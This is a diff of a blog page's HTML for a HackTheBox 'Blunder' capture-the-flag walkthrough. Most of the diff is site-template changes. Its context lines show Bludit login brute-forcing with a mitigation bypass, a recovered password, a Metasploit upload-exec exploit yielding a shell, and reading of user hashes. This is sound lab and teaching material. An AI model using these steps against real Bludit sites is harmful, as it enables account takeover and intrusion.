@@ -13,9 +13,9 @@
 <meta name="description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
 
 
-  <meta name="author" content="Your Name">
+  <meta name="author" content="DcodeZer0">
   
-  <meta property="article:author" content="Your Name">
+  <meta property="article:author" content="DcodeZer0">
   
 
 
@@ -23,16 +23,28 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Dcodezero">
 <meta property="og:title" content="HackTheBox Blunder">
-<meta property="og:url" content="https://dcodezero.github.io//hackthebox/Blunder/">
+<meta property="og:url" content="http://0.0.0.0:4000/hackthebox/Blunder/">
 
 
   <meta property="og:description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
 
 
 
-  <meta property="og:image" content="https://dcodezero.github.io//assets/img/sample/blunder/blunder.png">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/img/sample/blunder/blunder.png">
 
 
+
+  <meta name="twitter:site" content="@Dcodezer0">
+  <meta name="twitter:title" content="HackTheBox Blunder">
+  <meta name="twitter:description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+  <meta name="twitter:url" content="http://0.0.0.0:4000/hackthebox/Blunder/">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="http://0.0.0.0:4000/assets/img/sample/blunder/blunder.png">
+  
+
+  
 
 
 
@@ -47,7 +59,7 @@
   
 
 
-<link rel="canonical" href="https://dcodezero.github.io//hackthebox/Blunder/">
+<link rel="canonical" href="http://0.0.0.0:4000/hackthebox/Blunder/">
 
 
 
@@ -93,7 +105,7 @@ document.addEventListener("DOMContentLoaded", function() {
 </script><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>
 document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
- 
+ window.enable_copy_code_button = true;
 </script>
 <!-- For all browsers -->
 <link rel="stylesheet" href="/assets/css/main.css">
@@ -124,6 +136,8 @@ document.documentElement.className = document.documentElement.className.replace(
   <div class="masthead__inner-wrap">
     <div class="masthead__menu">
       <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
         
         <a class="site-title" href="/">
           Dcodezero
@@ -160,6 +174,11 @@ document.documentElement.className = document.documentElement.className.replace(
                 
               >Tools</a>
             </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
         
         <button class="greedy-nav__toggle hidden" type="button">
           <span class="visually-hidden">Toggle menu</span>
@@ -201,8 +220,15 @@ document.documentElement.className = document.documentElement.className.replace(
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-07-01T00:00:00+00:00">July 1, 2020</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
@@ -211,7 +237,7 @@ document.documentElement.className = document.documentElement.className.replace(
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          8 minute read
+          10 minute read
         
       </span>
     
@@ -229,6 +255,43 @@ document.documentElement.className = document.documentElement.className.replace(
 
 
 
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Blunder</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
 
 <div id="main" role="main">
   
@@ -239,14 +302,21 @@ document.documentElement.className = document.documentElement.className.replace(
 <div itemscope itemtype="https://schema.org/Person" class="h-card">
 
   
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="/" itemprop="url">Your Name</a>
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
-        <p>I am an <strong>amazing</strong> person.</p>
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
 
       </div>
     
@@ -264,21 +334,28 @@ document.documentElement.className = document.documentElement.className.replace(
       
         
           
-        
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
           
         
           
-        
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
           
         
           
-        
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
           
         
       
 
       
 
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
       
 
       
@@ -380,13 +457,13 @@ Nmap done: 1 IP address (1 host up) scanned in 175.80 seconds
 <p>Seeing that Port 80 is open, So I need to ennumerate on only one port..</p>
 
 <blockquote>
-  <p>Using some manual enumeration I found the page <code>blunder.htb/admin</code> which took me to the <code>admin</code> page.</p>
+  <p>Using some manual enumeration I found the page <code class="language-plaintext highlighter-rouge">blunder.htb/admin</code> which took me to the <code class="language-plaintext highlighter-rouge">admin</code> page.</p>
 </blockquote>
 
 <p><img src="/assets/img/sample/blunder/blunder2.png" alt="" /></p>
 
 <blockquote>
-  <p>Seeing the name <code>BLUDIT</code> I searched for an exploit online. <code> https://www.exploit-db.com/exploits/47699 </code> and that has a <code>Metasploit</code> module to it.</p>
+  <p>Seeing the name <code class="language-plaintext highlighter-rouge">BLUDIT</code> I searched for an exploit online. <code class="language-plaintext highlighter-rouge"> https://www.exploit-db.com/exploits/47699 </code> and that has a <code class="language-plaintext highlighter-rouge">Metasploit</code> module to it.</p>
 </blockquote>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE
@@ -401,7 +478,7 @@ Matching Modules
 0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
 </code></pre></div></div>
 
-<p>Using <code>Gobuster</code> to find some intersting stuff on the page.</p>
+<p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find some intersting stuff on the page.</p>
 
 <h2 id="gobuster">Gobuster</h2>
 
@@ -426,19 +503,19 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 </code></pre></div></div>
 
-<p>Visiting the page <code>blunder.htb/todo.txt</code></p>
+<p>Visiting the page <code class="language-plaintext highlighter-rouge">blunder.htb/todo.txt</code></p>
 
 <p><img src="/assets/img/sample/blunder/blunder1.png" alt="" /></p>
 
-<p>Assuming the username to be <code>Fergus</code></p>
+<p>Assuming the username to be <code class="language-plaintext highlighter-rouge">Fergus</code></p>
 
-<p>After trying a bunch of different stuff I found a way to bruteforce the login page <code>blunder.htb/admin</code> with the help of <code>bludit-mitigation-bypass</code>.
+<p>After trying a bunch of different stuff I found a way to bruteforce the login page <code class="language-plaintext highlighter-rouge">blunder.htb/admin</code> with the help of <code class="language-plaintext highlighter-rouge">bludit-mitigation-bypass</code>.
 <br /></p>
 
 <p><br /></p>
 
 <blockquote>
-  <p><code> https://rastating.github.io/bludit-brute-force-mitigation-bypass/ </code></p>
+  <p><code class="language-plaintext highlighter-rouge"> https://rastating.github.io/bludit-brute-force-mitigation-bypass/ </code></p>
 </blockquote>
 
 <p><br /></p>
@@ -492,7 +569,7 @@ for password in wordlist:
             break
 </code></pre></div></div>
 
-<p>So to do this I made a custom password list <code>bluditpass.txt</code> using <code>CEWl</code>.</p>
+<p>So to do this I made a custom password list <code class="language-plaintext highlighter-rouge">bluditpass.txt</code> using <code class="language-plaintext highlighter-rouge">CEWl</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -d 4 -m 5 -w bluditpass.txt --with-numbers http://blunder.htb 
 CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
@@ -910,7 +987,7 @@ Use fergus:RolandDeschain to login.
 </code></pre></div></div>
 
 <blockquote>
-  <p><code>SUCCESS: Password found! Use fergus:RolandDeschain to login.</code></p>
+  <p><code class="language-plaintext highlighter-rouge">SUCCESS: Password found! Use fergus:RolandDeschain to login.</code></p>
 </blockquote>
 
 <h4 id="checking-the-credentials-with-the-login-page-works">Checking the credentials with the login page works!</h4>
@@ -919,7 +996,7 @@ Use fergus:RolandDeschain to login.
 
 <h4 id="as-all-the-required-credentials-are-found-its-time-to-step-up-the-game">As all the required credentials are found, its time to step up the game.</h4>
 
-<p>Using <code>metasploit</code> to get the initial foothold.</p>
+<p>Using <code class="language-plaintext highlighter-rouge">metasploit</code> to get the initial foothold.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE
 
@@ -945,7 +1022,7 @@ bluditpass =&gt; RolandDeschain
 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 </code></pre></div></div>
 
-<p>If the config is set correctly then there should be no problem of getting the <code>meterpreter</code> session.</p>
+<p>If the config is set correctly then there should be no problem of getting the <code class="language-plaintext highlighter-rouge">meterpreter</code> session.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 
@@ -974,7 +1051,7 @@ shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
 hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
 </code></pre></div></div>
 
-<h5 id="enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in <code>bl-content/databases</code>.</h5>
+<h5 id="enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in <code class="language-plaintext highlighter-rouge">bl-content/databases</code>.</h5>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www$ cd bludit-3.10.0a
 cd bludit-3.10.0a
@@ -995,7 +1072,7 @@ categories.php  plugins       site.php    tags.php
 pages.php       security.php  syslog.php  users.php
 </code></pre></div></div>
 
-<h4 id="checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the <code>Users.php</code> found the hash of <code>HUGO</code>.</h4>
+<h4 id="checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the <code class="language-plaintext highlighter-rouge">Users.php</code> found the hash of <code class="language-plaintext highlighter-rouge">HUGO</code>.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
 cat users.php
@@ -1043,7 +1120,7 @@ d******************************a
 
 <h2 id="time-for-privilege-escalation">Time for Privilege Escalation.</h2>
 
-<p>Checking the sudo permissions of <code>hugo</code></p>
+<p>Checking the sudo permissions of <code class="language-plaintext highlighter-rouge">hugo</code></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$ sudo -l
 sudo -l
@@ -1135,11 +1212,11 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
       <section class="page__share">
   <h4 class="page__share-title">Share on</h4>
 
-  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Blunder%20%2Fhackthebox%2FBlunder%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=Dcodezer0&text=HackTheBox+Blunder%20%2Fhackthebox%2FBlunder%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdcodezero.github.io%2F%2Fhackthebox%2FBlunder%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fhackthebox%2FBlunder%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://dcodezero.github.io//hackthebox/Blunder/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://0.0.0.0:4000/hackthebox/Blunder/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -1189,17 +1266,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          18 minute read
+          24 minute read
         
       </span>
     
@@ -1234,17 +1318,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          6 minute read
+          9 minute read
         
       </span>
     
@@ -1279,17 +1370,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-05T00:00:00+00:00">January 5, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          6 minute read
+          9 minute read
         
       </span>
     
@@ -1324,17 +1422,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-04T00:00:00+00:00">January 4, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          8 minute read
+          11 minute read
         
       </span>
     
@@ -1357,6 +1462,17 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
       
     </div>
 
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
     
  
   
@@ -1442,7 +1558,7 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 </div>
 
 
-<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">Dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
+<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
 
       </footer>
     </div>
@@ -1453,7 +1569,30 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
 
 
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
 
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hackthebox/Blunder/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Blunder"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
 
 
 
